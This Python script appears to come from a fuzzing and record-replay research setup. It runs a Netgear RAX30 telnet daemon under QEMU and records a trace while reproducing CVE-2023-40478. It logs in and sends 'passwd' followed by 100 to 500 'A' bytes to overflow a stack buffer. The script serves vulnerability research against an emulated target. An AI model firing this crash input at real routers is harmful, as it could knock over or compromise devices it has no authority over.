#!/usr/bin/env python3
"""
Record trace for RAX30 Telnet service - CVE-2023-40478
Stack-based buffer overflow in Telnet CLI passwd command

CVE Details:
- Endpoint: Telnet service (port 23)
- Vulnerable: passwd command
- Type: Stack buffer overflow
- Impact: RCE with authentication bypass potential
"""

import os
import sys
import subprocess
import time
import socket
import threading

# Configuration
QEMU_PATH = "/home/webfuzz/Documents/qemu/build/qemu-arm"
SIM_ROOT = "/home/webfuzz/Documents/qemu/linux-user/rr_fuzzing/tests/images/RAX30/sim_root"
TELNET_BIN = "usr/sbin/utelnetd"  # or bin/telnetd
TRACE_FILE = "/home/webfuzz/Documents/qemu/linux-user/rr_fuzzing/crashes/real_world_repro/RAX30_TELNET/traces/rax30_telnet_passwd.trace"
TELNET_PORT = 2323

def start_telnet_server():
    """Start utelnetd in QEMU with trace recording"""
    print(f"[*] Starting telnetd on port {TELNET_PORT}...")
    
    # Ensure trace directory exists
    os.makedirs(os.path.dirname(TRACE_FILE), exist_ok=True)
    
    env = os.environ.copy()
    env["RR_MODE"] = "RECORD"
    env["RR_TRACE_FILE"] = TRACE_FILE
    env["LD_LIBRARY_PATH"] = f"{SIM_ROOT}/lib:{SIM_ROOT}/usr/lib"
    
    # Kill any existing instances
    subprocess.run(["pkill", "-f", "qemu-arm.*telnet"], stderr=subprocess.DEVNULL)
    subprocess.run(["pkill", "-f", "utelnetd"], stderr=subprocess.DEVNULL)
    time.sleep(1)
    
    cmd = [
        QEMU_PATH,
        "-L", SIM_ROOT,
        f"{SIM_ROOT}/{TELNET_BIN}",

        "-p", "2323",
        "-l", "/bin/sh"
    ]
    
    print(f"[*] Command: {' '.join(cmd)}")
    
    try:
        proc = subprocess.Popen(
            cmd, 
            env=env, 
            cwd=SIM_ROOT,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Wait for server to start
        time.sleep(3)
        
        # Check if process is still running
        if proc.poll() is not None:
            stdout, stderr = proc.communicate()
            print(f"[-] telnetd exited early!")
            print(f"    stdout: {stdout.decode('utf-8', errors='ignore')}")
            print(f"    stderr: {stderr.decode('utf-8', errors='ignore')}")
            return None
        
        print(f"[+] telnetd started (PID: {proc.pid})")
        return proc
        
    except Exception as e:
        print(f"[-] Error starting telnetd: {e}")
        return None

def send_telnet_commands(host="127.0.0.1", port=TELNET_PORT):
    """Connect to telnet and send passwd command with potential overflow"""
    print(f"[*] Connecting to telnet at {host}:{port}...")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        
        print("[+] Connected to telnet server")
        
        # Read initial banner
        time.sleep(0.5)
        try:
            banner = sock.recv(1024)
            print(f"[*] Banner: {banner[:100]}")
        except socket.timeout:
            print("[*] No banner received")
        
        # Send login (if prompted)
        time.sleep(0.5)
        sock.sendall(b"admin\r\n")
        time.sleep(0.5)
        
        try:
            response = sock.recv(1024)
            print(f"[*] Response: {response[:100]}")
        except socket.timeout:
            pass
        
        # Send password
        time.sleep(0.5)
        sock.sendall(b"password\r\n")
        time.sleep(0.5)
        
        try:
            response = sock.recv(1024)
            print(f"[*] Auth response: {response[:100]}")
        except socket.timeout:
            pass
        
        # Send passwd command with overflow payload
        # CVE-2023-40478: Stack buffer overflow in passwd command
        print("[*] Sending passwd command with long input...")
        
        # Try different payload sizes to trigger overflow
        for size in [100, 200, 300, 500]:
            payload = b"passwd\r\n"
            sock.sendall(payload)
            time.sleep(0.3)
            
            try:
                prompt = sock.recv(1024)
                print(f"[*] Passwd prompt: {prompt[:50]}")
            except socket.timeout:
                pass
            
            # Send long password to trigger overflow
            overflow_data = b"A" * size + b"\r\n"
            print(f"[*] Sending {size} bytes...")
            sock.sendall(overflow_data)
            time.sleep(0.5)
            
            try:
                response = sock.recv(1024)
                print(f"[*] Response ({size}B): {len(response)} bytes")
            except socket.timeout:
                print(f"[*] Timeout after {size}B (potential crash)")
                break
            except Exception as e:
                print(f"[*] Exception after {size}B: {e} (potential crash)")
                break
        
        print("[+] Payload sent successfully")
        
    except ConnectionRefusedError:
        print("[-] Connection refused - telnet server not running?")
    except Exception as e:
        print(f"[-] Error during telnet session: {e}")
    finally:
        try:
            sock.close()
        except:
            pass

def record_trace():
    """Main recording function"""
    print("="*60)
    print("RAX30 Telnet Trace Recording - CVE-2023-40478")
    print("="*60)
    
    # Start telnet server
    proc = start_telnet_server()
    
    if proc is None:
        print("[-] Failed to start telnet server")
        return False
    
    try:
        # Give server time to initialize
        time.sleep(2)
        
        # Send exploit payload
        send_telnet_commands()
        
        # Wait for trace to flush
        time.sleep(2)
        
        # Terminate server
        print("[*] Terminating telnet server...")
        proc.terminate()
        proc.wait(timeout=5)
        
        # Check if trace was created
        if os.path.exists(TRACE_FILE):
            size = os.path.getsize(TRACE_FILE)
            print(f"[+] Trace recorded: {TRACE_FILE} ({size} bytes)")
            
            # Also check for .bbl file
            bbl_file = TRACE_FILE.replace('.trace', '.trace.bbl')
            if os.path.exists(bbl_file):
                print(f"[+] BBL file: {bbl_file}")
            
            return True
        else:
            print(f"[-] Trace file not created: {TRACE_FILE}")
            return False
            
    except Exception as e:
        print(f"[-] Error during recording: {e}")
        if proc:
            proc.kill()
        return False
    finally:
        # Cleanup
        subprocess.run(["pkill", "-f", "qemu-arm.*telnet"], stderr=subprocess.DEVNULL)

if __name__ == "__main__":
    success = record_trace()
    sys.exit(0 if success else 1)
